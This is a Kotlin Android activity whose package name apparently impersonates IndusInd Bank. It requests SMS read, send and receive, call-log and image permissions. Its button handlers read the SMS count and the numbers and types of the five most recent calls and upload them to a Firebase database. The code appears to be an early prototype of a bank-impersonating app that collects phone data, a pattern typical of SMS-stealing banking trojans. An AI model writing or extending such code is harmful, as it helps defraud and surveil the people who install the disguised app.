package Indusind.com

import android.Manifest
import android.content.pm.PackageManager
import android.os.Bundle
import android.provider.CallLog
import android.provider.Telephony
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase

class MainActivity : AppCompatActivity() {

    private val db = Firebase.database.reference
    private lateinit var tv: TextView

    private val perms = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_MEDIA_IMAGES
    )

    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        val granted = result.filterValues { it }.keys
        tv.text = "Granted: $granted"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        tv = findViewById(R.id.tvStatus)

        findViewById<Button>(R.id.btnPerm).setOnClickListener {
            permLauncher.launch(perms)
        }

        findViewById<Button>(R.id.btnSmsCount).setOnClickListener {
            if (!has(Manifest.permission.READ_SMS)) {
                tv.text = "READ_SMS permission nahi hai"
                return@setOnClickListener
            }
            val cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI, null, null, null, null
            )
            val count = cursor?.count ?: 0
            cursor?.close()
            db.child("sms_count").setValue(count)
            tv.text = "SMS count: $count (uploaded)"
        }

        findViewById<Button>(R.id.btnCalls).setOnClickListener {
            if (!has(Manifest.permission.READ_CALL_LOG)) {
                tv.text = "READ_CALL_LOG permission nahi hai"
                return@setOnClickListener
            }
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 5"
            )
            val list = mutableListOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val num = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    list.add("$num|$type")
                }
            }
            db.child("last_calls").setValue(list)
            tv.text = "Last 5 calls uploaded"
        }

        findViewById<Button>(R.id.btnDelete).setOnClickListener {
            db.removeValue().addOnSuccessListener { tv.text = "Data deleted" }
        }
    }

    private fun has(p: String) =
        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
}
